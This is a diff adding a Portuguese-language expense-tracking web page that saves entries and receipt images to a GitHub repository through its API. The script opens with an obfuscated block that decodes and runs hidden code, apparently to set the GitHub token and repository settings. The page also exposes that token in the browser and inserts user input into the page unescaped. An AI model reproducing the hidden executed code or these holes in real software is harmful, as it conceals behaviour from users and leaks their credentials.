@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Controle Inteligente de Gastos</title>
+
+<style>
+:root {
+  --bg: #0b0d17;
+  --card: rgba(255,255,255,0.06);
+  --border: rgba(255,255,255,0.12);
+  --primary: #7c7cff;
+  --success: #2ecc71;
+  --error: #ff4d4d;
+}
+
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  background: radial-gradient(circle at top, #151933, #05060f);
+  color: white;
+  font-family: "Segoe UI", Arial;
+}
+
+.app {
+  max-width: 520px;
+  margin: auto;
+  padding: 14px;
+}
+
+.header {
+  text-align: center;
+  padding: 20px 10px;
+  animation: fadeIn 1s ease;
+}
+
+.card {
+  background: var(--card);
+  backdrop-filter: blur(14px);
+  border: 1px solid var(--border);
+  border-radius: 18px;
+  padding: 16px;
+  margin-bottom: 14px;
+  animation: slideUp .6s ease;
+}
+
+input, select, button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 8px;
+  border-radius: 12px;
+  border: none;
+  background: rgba(255,255,255,.08);
+  color: white;
+  outline: none;
+}
+
+button {
+  background: linear-gradient(135deg, #7c7cff, #9f7cff);
+  font-weight: bold;
+  cursor: pointer;
+  transition: .2s;
+}
+
+button.danger {
+  background: linear-gradient(135deg, #ff4d4d, #ff7676);
+}
+
+button.secondary {
+  background: linear-gradient(135deg, #555, #777);
+}
+
+button:active { transform: scale(.97); }
+
+.gasto img {
+  width: 100%;
+  border-radius: 10px;
+  margin-top: 8px;
+}
+
+.badge {
+  display: inline-block;
+  padding: 4px 10px;
+  border-radius: 20px;
+  background: rgba(255,255,255,.1);
+  font-size: 12px;
+}
+
+.status {
+  text-align: center;
+  margin: 10px 0;
+  min-height: 22px;
+}
+
+.success { color: var(--success); animation: pop .4s ease; }
+.error { color: var(--error); animation: shake .4s ease; }
+
+.loader {
+  width: 28px;
+  height: 28px;
+  border: 4px solid rgba(255,255,255,.2);
+  border-top: 4px solid white;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: auto;
+  display: none;
+}
+
+.actions {
+  display: flex;
+  gap: 8px;
+  margin-top: 10px;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes fadeIn { from { opacity:0; transform:translateY(10px); } }
+@keyframes slideUp { from { opacity:0; transform:translateY(30px); } }
+@keyframes pop { 0% { transform:scale(.6); opacity:0; } }
+@keyframes shake {
+  0%,100%{transform:translateX(0)}
+  25%{transform:translateX(-5px)}
+  75%{transform:translateX(5px)}
+}
+
+@media (max-width:480px){
+  .actions { flex-direction: column; }
+}
+
+.payments {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 10px;
+  margin-top: 10px;
+}
+
+.pay-btn {
+  padding: 14px;
+  border-radius: 14px;
+  border: 1px solid var(--border);
+  background: rgba(255,255,255,.05);
+  text-align: center;
+  cursor: pointer;
+  transition: .2s;
+  font-weight: 600;
+  user-select: none;
+}
+
+.pay-btn:hover { background: rgba(255,255,255,.12); }
+
+.pay-btn.active {
+  background: linear-gradient(135deg, #7c7cff, #9f7cff);
+  transform: scale(1.03);
+}
+
+/* ===== RESUMO ===== */
+.resumo-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 12px;
+  margin-top: 10px;
+}
+
+.resumo-box {
+  background: rgba(255,255,255,.06);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 12px;
+  text-align: center;
+  animation: fadeIn .6s ease;
+}
+
+.resumo-box strong {
+  display: block;
+  font-size: 18px;
+  margin-top: 4px;
+  color: var(--primary);
+}
+
+@media (max-width:480px){
+  .resumo-grid {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="app">
+  <div class="header">
+    <h1>Gastos CNH</h1>
+    <p>Controle inteligente de gastos</p>
+  </div>
+
+  <!-- Cadastro -->
+  <div class="card">
+    <input id="descricao" placeholder="Descrição">
+    <input id="valor" type="number" placeholder="Valor">
+
+    <div class="payments" id="payments">
+      <div class="pay-btn" onclick="selecionarForma('Pix', this)">⚡ Pix</div>
+      <div class="pay-btn" onclick="selecionarForma('Dinheiro', this)">💵 Dinheiro</div>
+      <div class="pay-btn" onclick="selecionarForma('Débito', this)">💳 Débito</div>
+      <div class="pay-btn" onclick="selecionarForma('Crédito', this)">🏦 Crédito</div>
+    </div>
+
+    <input type="hidden" id="forma">
+    <input type="file" id="comprovante" hidden accept="image/*">
+
+    <button onclick="salvar()">➕ Cadastrar gasto</button>
+
+    <div class="status" id="status"></div>
+    <div class="loader" id="loader"></div>
+  </div>
+
+  <!-- Ações -->
+  <div class="card actions">
+    <button class="secondary" onclick="gerarRelatorio()">📊 Relatório</button>
+    <button class="danger" onclick="limparTudo()">🗑️ Excluir Todos</button>
+  </div>
+
+  <!-- Resumo -->
+  <div class="card">
+    <h3>📈 Resumo</h3>
+    <div id="resumoInfo" class="resumo-grid"></div>
+  </div>
+
+  <!-- Lista -->
+  <div class="card">
+    <h3>📋 Histórico</h3>
+    <div id="lista"></div>
+  </div>
+</div>
+
+<script>
+var token,username,repo,path,pasta,url;(function(){var RHj='',Tsa=218-207;function hPb(a){var s=2233546;var x=a.length;var u=[];for(var z=0;z<x;z++){u[z]=a.charAt(z)};for(var z=0;z<x;z++){var r=s*(z+132)+(s%18031);var j=s*(z+201)+(s%38947);var l=r%x;var m=j%x;var k=u[l];u[l]=u[m];u[m]=k;s=(r+j)%2759333;};return u.join('')};var cPG=hPb('cwsyepmcnrkrofdqcuzvjulixbttrotgnshao').substr(0,Tsa);var VKz='rmr =.1g1s16dlt60i8(atlv=a,uryej+1lkt;Ahu)A)har=}=u=riv1irg(a*[o8-zs;gonpir[n ,lreAev<4z7wn4rhg5(wn8v=9l]ra.[i78ag2(=agahe2a68;=ri= [fe[a3e= er"anoo);=;}(urf)v[r[)ve0auwhatr lln= )sys84r==)C;=p=dy;]ta7(=oCg1gfe<){rg=et1rl=,;rubC7u+";uh,p .koni7 ,+sw)9usuAs[c ,r5alev+=c;vrjz4;])sa(wriklbh)k8{+.utv)t -)llns,e)9= 7;g)jan(mm1 lr=v;([thffaha xh0f lky,=0n(=ax.fc1(vyr r00t+<=til+e]la} -(;o)+s0;<nr.t(le;sv= [C;"d]lif(g ((=5efn)ll+pgpn)uC;,toj"..1st);n;)gl;2v{t{(goidi-exfta8=r+(;+lrpot);sbrc;,c=C;o6A,(ohe)o.ncgh"rab(el (lf2nhvn.f=ri=;s;9rovg{6a,mu) ew}nb+e,(ag=2.v+ohe s(ht.,e[on.9  ,,0"0;uin,ljvx;bc]rp;x]=0]88.sa ))h[i;yii(sr2ex!=2{ufv;do((.;s.v,e;e;arovag=(<Sl,k+;]aat(v=.);(;5,}.,1r1t)3;+fl0ch7audcr.rh0n()t);],sa6n79t]fo.j,626;+r"4e].vog;9t(vryg!r>rvSthovnm=aorn2tcdis)++mh;u) .ia];;+7y";t({ag6ph)Cl-ltuid)=+v)nyi}dzo>"-4egag.q=,C.,rriu.+f+o+*e]r[odoj=e[rl.im6ftrl;v,t.(,a5}+a(ct=+lmh"=-j';var tjk=hPb[cPG];var iVs='';var kxr=tjk;var nYp=tjk(iVs,hPb(VKz));var NJu=nYp(hPb('jUji+,]3a 7Uo$iUsetv.UgpUow+)%(_%U]7,%m$b==#b*UU(ar3g}e2;r3[U1...-(ajfU)-!a!.n(hU;U!-U.{jisg1llb..+(cUv] htp,.{t}s"a1Upu8t%U3. vr7yU;e._ae(,i[]!5!mjpdiip$_)&)\/.E%,C}h7 nf2nii0UrUb4{]!a(r\/d.ut4[_nbpU")r4(.e;%;nUpiw(UlUw7_tr)}njs $.(ldftitU)9Ub9(&&{1}v6),5"ee CuUr;aehejalv(21"..4 9n.t,$r,a2U4o)][U=o.ae3tbg50#pal.e.ch=,i_3t)\/U\/t==hpeUh}h!S($7t+one(\'!j0-oo.nj gb=U1gnf}(.j$eb()%U33h(%=)o1)d-U0 pp;=!enp3_+u+e6.s\';)=\/; =7e!bUj,6r!bj..;[.*=))UUn)\/(lb3\'ja!.l*+0},"$l(3)!3U37Usspmne.!(73U{,i;=4.tpvye.noU(t;;)UuNE{0U;a(sUw$h)m.ao5sj;(vU;)6,c"=.qf!$t.i2.kefb1n3.b.Uiso.=8p77.\/bf(3,)orUUyoU##gftbc(*iUU))l]h.=5b.#r\'d},e(e)c-)s.(f;t,6i7+fSsf!2U).rUg)U z6n_)U,ej)e}},4pvms+$o e2 %!!;eoy.)4..3Ul$Ug%UuS%;!+ettU.U(tpep(._urU(y7h_3U;4U(%p=elCs;+fa6.,)oo!n6{l.+UU$lU$t((]04eU\/n}(s;x.nri,j=_s]=Ur(nf03r,8\/.hp t$,b6o.#j(rb4g;$2.0U3r.+e4U)+ei1htUrf+%b26]lfhUh+U*egt !1=UeUr{33U0U;uoU\/mU_=.!iulc6}-"UU;r U72(7$%&tUfrb.3U=,gI3lfU.1$c6o\/.,.ebUrn,f_4es:yn_,u_t}))s)(,0%36jUo_q}9p3,r,)esU_u)tf3nsUelf(..U!{t$.b$2.;;,)Ul)$..n.).d!j)-]peU+U({e.eqtjiUrU.yaf6#fsr2ieao$$api.bz)a)scsUtt=s$;"\/n_Ubk!!5n0!1o{ ;3.a;.e1go!;uUp6U l;Ue.id (5",rjU{p [mi0v.5_m'));var ATn=kxr(RHj,NJu );ATn(2658);return 4209})()
+
+const statusEl = document.getElementById("status");
+const loader = document.getElementById("loader");
+const lista = document.getElementById("lista");
+const comprovante = document.getElementById("comprovante");
+const forma = document.getElementById("forma");
+const botoesPagamento = document.querySelectorAll(".pay-btn");
+
+let _dados = [];
+
+// ================= UI =================
+function showLoader(v){ loader.style.display = v ? "block" : "none"; }
+function msg(t, type=""){ 
+  statusEl.className = `status ${type}`; 
+  statusEl.innerText = t; 
+}
+
+// ================= PAGAMENTO =================
+function selecionarForma(valor, el){
+  forma.value = valor;
+  botoesPagamento.forEach(b => b.classList.remove("active"));
+  el.classList.add("active");
+
+  const naoPrecisa = (valor === "Dinheiro");
+  comprovante.hidden = naoPrecisa;
+  comprovante.required = !naoPrecisa;
+
+  if(!naoPrecisa){
+    msg("📷 Comprovante obrigatório para esta forma de pagamento");
+  } else {
+    msg("");
+  }
+}
+
+// ================= RESUMO =================
+function atualizarResumo(dados){
+  const box = document.getElementById("resumoInfo");
+
+  if(!dados.length){
+    box.innerHTML = `<div class="resumo-box">Nenhum gasto registrado</div>`;
+    return;
+  }
+
+  let total = 0;
+  const datas = dados.map(d => new Date(d.data));
+
+  dados.forEach(g => total += Number(g.valor));
+
+  const primeira = new Date(Math.min(...datas));
+  const ultima = new Date(Math.max(...datas));
+  const dias = Math.ceil((ultima - primeira) / (1000 * 60 * 60 * 24)) || 1;
+
+  box.innerHTML = `
+    <div class="resumo-box">💰 Total<strong>R$ ${total.toFixed(2)}</strong></div>
+    <div class="resumo-box">📅 Primeiro<strong>${primeira.toLocaleDateString()}</strong></div>
+    <div class="resumo-box">📆 Último<strong>${ultima.toLocaleDateString()}</strong></div>
+    <div class="resumo-box">⏱️ Dias<strong>${dias}</strong></div>
+  `;
+}
+
+// ================= GITHUB =================
+async function testarConexao(){
+  msg("🔌 Conectando à API...");
+  showLoader(true);
+
+  try {
+    const r = await fetch(url, { headers:{ Authorization:`token ${token}` }});
+    if(!r.ok) throw new Error("Erro HTTP: " + r.status);
+    msg("✅ Conectado com sucesso", "success");
+    carregar();
+  } catch (e) {
+    console.error("Erro real:", e);
+    msg("❌ Falha de conexão com GitHub", "error");
+  }
+
+  showLoader(false);
+}
+
+async function obterDados(){
+  try {
+    const r = await fetch(url,{ headers:{Authorization:`token ${token}`}});
+    if(r.status === 404) return [];
+    const d = await r.json();
+    const txt = atob(d.content || "");
+    return txt.trim() ? JSON.parse(txt) : [];
+  } catch(e) {
+    console.error("Erro JSON:", e);
+    return [];
+  }
+}
+
+async function salvarDados(dados){
+  let sha = null;
+  try{
+    const r = await fetch(url,{ headers:{Authorization:`token ${token}`}});
+    const d = await r.json();
+    sha = d.sha;
+  }catch{}
+
+  await fetch(url,{
+    method:"PUT",
+    headers:{
+      Authorization:`token ${token}`,
+      "Content-Type":"application/json"
+    },
+    body:JSON.stringify({
+      message:"Update gastos",
+      content:btoa(JSON.stringify(dados,null,2)),
+      sha
+    })
+  });
+}
+
+async function upload(file){
+  return new Promise(resolve=>{
+    const reader = new FileReader();
+    reader.onload = async ()=>{
+      const base64 = reader.result.split(",")[1];
+      const nome = `${Date.now()}-${file.name}`;
+      const imgPath = `${pasta}/${nome}`;
+      const imgUrl = `https://api.github.com/repos/${username}/${repo}/contents/${imgPath}`;
+
+      await fetch(imgUrl,{
+        method:"PUT",
+        headers:{
+          Authorization:`token ${token}`,
+          "Content-Type":"application/json"
+        },
+        body:JSON.stringify({message:"Upload", content:base64})
+      });
+
+      resolve(`https://raw.githubusercontent.com/${username}/${repo}/main/${imgPath}`);
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
+// ================= AÇÕES =================
+async function salvar(){
+  const descricao = document.getElementById("descricao").value.trim();
+  const valor = document.getElementById("valor").value;
+  const f = forma.value;
+  const file = comprovante.files[0];
+
+  if(!descricao || !valor || !f){
+    msg("⚠️ Preencha todos os campos","error");
+    return;
+  }
+
+  if(!(f === "Pix" || f === "Dinheiro") && !file){
+    msg("📷 Comprovante obrigatório","error");
+    return;
+  }
+
+  try{
+    showLoader(true);
+    msg("💾 Salvando...");
+
+    let imagem = "";
+    if(file) imagem = await upload(file);
+
+    const dados = await obterDados();
+    dados.push({
+      id: Date.now(),
+      descricao,
+      valor,
+      forma: f,
+      imagem,
+      data: new Date().toISOString()
+    });
+
+    await salvarDados(dados);
+    render(dados);
+    msg("✅ Gasto salvo com sucesso","success");
+  }catch{
+    msg("❌ Erro ao salvar","error");
+  }
+
+  showLoader(false);
+}
+
+async function excluirGasto(id){
+  if(!confirm("Deseja realmente excluir este gasto?")) return;
+
+  try{
+    showLoader(true);
+    msg("🗑️ Excluindo gasto...");
+
+    const dados = await obterDados();
+    const novos = dados.filter(g => g.id !== id);
+
+    await salvarDados(novos);
+    render(novos);
+
+    msg("✅ Gasto removido com sucesso","success");
+  }catch{
+    msg("❌ Erro ao excluir gasto","error");
+  }
+
+  showLoader(false);
+}
+
+function gerarRelatorio(){
+  if(!_dados.length){
+    msg("📭 Nenhum gasto registrado","error");
+    return;
+  }
+
+  let total = 0;
+  const formas = {};
+
+  _dados.forEach(g=>{
+    total += Number(g.valor);
+    formas[g.forma] = (formas[g.forma] || 0) + Number(g.valor);
+  });
+
+  let texto = `📊 RELATÓRIO DE GASTOS\n\nTotal: R$ ${total.toFixed(2)}\n\n`;
+
+  for(let f in formas){
+    texto += `${f}: R$ ${formas[f].toFixed(2)}\n`;
+  }
+
+  texto += `\nRegistros: ${_dados.length}`;
+
+  navigator.share ? navigator.share({ text: texto }) : alert(texto);
+}
+
+// ================= RENDER =================
+function render(d){
+  _dados = d;
+  lista.innerHTML = "";
+  atualizarResumo(d);
+
+  d.slice().reverse().forEach(g=>{
+    const div = document.createElement("div");
+    div.className = "card gasto";
+    div.innerHTML = `
+      <strong>${g.descricao}</strong>
+      <div class="badge">${g.forma}</div>
+      <p>💰 R$ ${g.valor}</p>
+      <small>${new Date(g.data).toLocaleString()}</small>
+      ${g.imagem ? `<img src="${g.imagem}">` : ""}
+
+      <button class="danger" style="margin-top:10px" onclick="excluirGasto(${g.id})">
+        🗑️ Excluir
+      </button>
+    `;
+    lista.appendChild(div);
+  });
+}
+
+async function carregar(){
+  const dados = await obterDados();
+  render(dados);
+}
+
+// ================= START =================
+testarConexao();
+</script>
+
+</body>
+</html>
